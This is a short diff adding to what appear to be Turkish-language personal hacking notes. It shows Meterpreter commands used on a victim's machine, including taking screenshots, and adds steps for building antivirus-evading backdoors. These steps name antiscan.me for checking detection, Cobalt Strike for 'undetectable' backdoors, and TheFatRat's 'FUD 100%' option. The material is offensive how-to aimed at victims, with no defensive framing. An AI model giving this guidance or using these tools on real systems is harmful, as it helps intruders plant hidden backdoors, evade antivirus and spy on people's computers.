@@ -41,3 +41,19 @@
 > meterpreter > sysinfo // Hedef makine hakkında temel sistem bilgilerini gösterir.
 > meterpreter > help // Alabileceğin tüm özellik ve bilgiler. ScreenShot-webcam-mouse...
 > meterpreter > screenshot //kurbanın o anki ekran görüntüsünü alır hacker a kaydeder
+
+\*\*\* antiscan.me //hangi defenderlara yakalanır test etmek için backdoor dosya test edilir
+
+\*\*\* cobaltstrike.com // Yakalanmayacak backdoorlar oluşturur. Ücretlidir
+
+** FatRat ile Backdoor oluşturmak **
+
+- github hesabında indir linkini al
+
+> git clone https://git... // komutu, terminalde bir uzaktaki Git reposunun aynısını bilgisayarına indirir.
+> sudo bash setup.sh // klasöre git setup dosyasını bash kabuğunda çalıştırır.
+
+- arayüz açılır
+  [TheFatRat] > 2 // 2.Create Fud 100% Backdoor with Fudwin 1.0 seçeneğini seçeriz kesin yakalanmayacağını söyler.
+  [TheFatRat] > 2 //Slow But Powerfull
+  ... backdoor dosyası oluşturulur.
